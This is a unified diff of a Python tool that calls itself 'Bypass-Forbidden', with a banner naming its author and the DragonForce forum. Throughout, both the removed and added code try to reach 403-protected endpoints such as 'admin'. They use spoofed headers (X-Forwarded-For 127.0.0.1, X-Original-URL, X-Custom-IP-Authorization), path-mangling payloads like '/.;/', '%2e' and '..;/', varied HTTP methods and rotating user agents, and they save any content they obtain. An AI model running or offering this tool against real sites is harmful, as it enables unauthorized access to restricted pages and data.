@@ -1,123 +1,135 @@
 import argparse
-import concurrent.futures
-import json
-import logging
-import sys
-
 import requests
-from colorama import Fore
-from fake_useragent import UserAgent
+import sys
+import os
+import json
+import random
+from concurrent.futures import ThreadPoolExecutor, wait
+from sys import stdout
+from colorama import Fore, Style
 
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+def banners():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    stdout.write("                                                                                         \n")
+    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
+    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
+    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
+    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
+    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
+    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
+    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
+    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
+    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI PARI-MALAM                               "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"FORUM     "+Fore.RED+"             |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"TELEGRAM  "+Fore.RED+"             |"+Fore.LIGHTWHITE_EX+"   @DRAGONFORCE.IO                               "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
+    print(f"{Fore.YELLOW}[Bypass-Forbidden] - {Fore.GREEN}Perform with bypassed 4xx content!\n{Style.RESET_ALL}")
+banners()
 
 parser = argparse.ArgumentParser()
-group = parser.add_mutually_exclusive_group()
-
-group.add_argument('-p', '--path', action='store', type=str, help='path to check', metavar='domain.com')
-parser.add_argument('-d', '--domains', action='store', help="domains to check", metavar="filename.txt")
-parser.add_argument('-t', '--target', action='store', help="domain to check", metavar="site.com")
-
+parser.add_argument("-url", help="A domain with the protocol. Example: https://example.com", required=True)
+parser.add_argument("-path", help="An endpoint. Example: admin", required=True)
+parser.add_argument("-output", help="Output file path for successful JSON responses", default="output.json")
 args = parser.parse_args()
 
-ua = UserAgent()
+url = args.url
+path = args.path
+output_file = args.output
 
+def ua(file_path):
+    with open(file_path, "r") as file:
+        user_agents = file.readlines()
+    user_agents = [user_agent.strip() for user_agent in user_agents]
+    return user_agents
 
-def load_wordlist(wordlist_path: str) -> list:
-    try:
-        with open(wordlist_path, 'r') as file:
-            return [line.strip() for line in file.readlines()]
-    except FileNotFoundError as e:
-        logger.error(f"File not found: {wordlist_path}")
-        sys.exit(1)
+def load_header_payloads(file_path):
+    with open(file_path, "r") as file:
+        header_payloads = file.readlines()
+    header_payloads = [payload.strip() for payload in header_payloads]
+    return header_payloads
 
+def load_http_methods(file_path):
+    with open(file_path, "r") as file:
+        http_methods = file.readlines()
+    http_methods = [method.strip().upper() for method in http_methods]
+    return http_methods
 
-def get_header_bypasses(path=None):
-    header_bypasses = [
-        {'User-Agent': str(ua.chrome)},
-        {'User-Agent': str(ua.chrome), 'X-Original-URL': path if path else '/'},
-        {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
-        {'User-Agent': str(ua.chrome), 'X-Originally-Forwarded-For': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Originating-': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Originating-IP': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'True-Client-IP': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-WAP-Profile': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Arbitrary': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-HTTP-DestinationURL': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-Proto': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'Destination': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Remote-IP': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Client-IP': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Host': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-Host': 'http://127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-ProxyUser-Ip': '127.0.0.1'},
-        {'User-Agent': str(ua.chrome), 'X-rewrite-url': path if path else '/'},
+def construct_endpoint_payloads(domain, path):
+    # ADD UR PAYLOAD HERE
+    payloads = [
+        domain + "/" + path.upper(),
+        domain + "/" + path + "/",
+        domain + "/" + path + "/.",
+        domain + "//" + path + "//",
+        domain + "/./" + path + "/./",
+        domain + "/./" + path + "/..",
+        domain + "/;/" + path,
+        domain + "/.;/" + path,
+        domain + "//;//" + path,
+        domain + "/" + path + "..;/",
+        domain + "/%2e/" + path,
+        domain + "/%252e/" + path,
+        domain + "/%ef%bc%8f" + path,
     ]
-    return header_bypasses
+    return payloads
 
-
-def get_port_based_bypasses(path=None):
-    port_based_bypasses = [
-        {'User-Agent': str(ua.chrome)},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '4443'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '80'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8080'},
-        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8443'},
-    ]
-    return port_based_bypasses
-
-
-def make_request(url: str, stream=False, path=None):
-    if path:
-        headers = get_header_bypasses(path=path)
-    else:
-        headers = get_header_bypasses()
+def penetrate_endpoint(session, endpoint, method, header=None):
     try:
-        for header in headers:
-            if stream:
-                response = requests.get(url, stream=True, headers=header)
-            else:
-                response = requests.get(url, headers=header)
-            if response.status_code == 200:
-                logger.info(f"{url} {json.dumps(list(header.items())[-1])} [200]")
-            else:
-                logger.warning(f"{url} {json.dumps(list(header.items())[-1])} [{response.status_code}]")
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request error: {e}")
-
-
-def check_domain(domain, bypass_list, path=None):
-    for bypass in bypass_list:
-        url = domain + (path + bypass if path else bypass)
-        make_request(url, stream=True, path=path)
-
+        headers = {}
+        if header:
+            header_name, header_value = header.split(":", 1)
+            header_name = header_name.strip()
+            header_value = header_value.strip()
+            headers[header_name] = header_value
+        user_agent = random.choice(user_agents)
+        headers["User-Agent"] = user_agent
+        response = session.request(method, endpoint, headers=headers, allow_redirects=True)
+        if response.status_code != 200:
+            print(f"{Fore.RED}{header} {endpoint} ({response.status_code} {response.reason}){Style.RESET_ALL}")
+        else:
+            print(f"{Fore.GREEN}{header} {endpoint} ({response.status_code} {response.reason}){Style.RESET_ALL}")
+            try:
+                data = response.json()
+                with open(f"Results/{output_file}", "a") as file:
+                    json.dump(data, file, indent=4)
+                    file.write("\n")
+                print(json.dumps(data, indent=4))
+            except ValueError:
+                content = response.content.decode()
+                print(content)
+                with open(f"Results/{output_file}", "a") as file:
+                    file.write(content)
+                    file.write("\n")
+    except Exception as e:
+        print(e)
 
 def main():
-    if args.domains:
-        bypass_list = load_wordlist(args.domains)
-        if args.path:
-            logger.info("Checking domains to bypass....")
-            for domain in bypass_list:
-                check_domain(domain, wordlist, path=args.path)
-        else:
-            logger.info("Checking domains to bypass....")
-            for domain in bypass_list:
-                check_domain(domain, wordlist)
-    elif args.target:
-        if args.path:
-            logger.info(f"Checking {args.target}...")
-            check_domain(args.target, wordlist, path=args.path)
-        else:
-            logger.info(f"Checking {args.target}...")
-            check_domain(args.target, wordlist)
+    print(f"{Fore.CYAN}\nDomain: {url}")
+    print(f"Path: {path}{Style.RESET_ALL}")
 
+    global user_agents
+    user_agents = ua('lib/ua.txt')
+
+    header_payloads = load_header_payloads('lib/headers.txt')
+    http_methods = load_http_methods('lib/methods.txt')
+
+    with requests.Session() as session:
+        print(f"{Fore.YELLOW}\nNormal Request{Style.RESET_ALL}")
+        endpoints = construct_endpoint_payloads(url, path)
+        with ThreadPoolExecutor() as executor:
+            futures = [executor.submit(penetrate_endpoint, session, endpoint, method) for endpoint in endpoints for method in http_methods]
+            wait(futures)
+
+        print(f"{Fore.YELLOW}\nRequest with Headers{Style.RESET_ALL}")
+        with ThreadPoolExecutor() as executor:
+            futures = [executor.submit(penetrate_endpoint, session, url, method, header) for method in http_methods for header in header_payloads]
+            wait(futures)
 
 if __name__ == "__main__":
     try:
-        wordlist = load_wordlist("bypasses.txt")
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            executor.submit(main)
+        main()
     except KeyboardInterrupt:
         sys.exit(0)
